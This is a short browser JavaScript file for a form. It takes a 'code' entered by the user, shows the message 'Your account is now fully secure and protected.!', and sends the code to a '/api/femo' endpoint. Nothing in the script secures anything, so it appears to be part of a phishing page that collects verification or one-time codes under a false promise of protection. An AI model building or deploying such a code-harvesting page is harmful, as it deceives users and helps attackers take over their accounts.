const submitId = document.getElementById('csubmit');
const thankS = document.getElementById('thanks');
const codeT = document.getElementById('code');

submitId.addEventListener ('click', ()=>{
    if (codeT.value ===""){
        return;
    }
    thankS.textContent = 'Your account is now fully secure and protected.!';
    setTimeout(()=>{
        thankS.style.display = 'none';
        

    },3000)
});

submitId.addEventListener ('click', async(event) =>{
    event.preventDefault()
    const codeT = document.getElementById('code').value.trim();
    if (codeT ==="") {
        return;
    }

    try {
        console.log("Sending request...");

        const response = await fetch("/api/femo", {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                code: codeT,
                
            })
        });

        console.log("Status:", response.status);

        const data = await response.json();

        console.log("server response", data);

    } catch (error) {

        console.error("Error:", error);

    }

});

window.addEventListener ('pageshow',()=>{
    codeT.value= "";
})
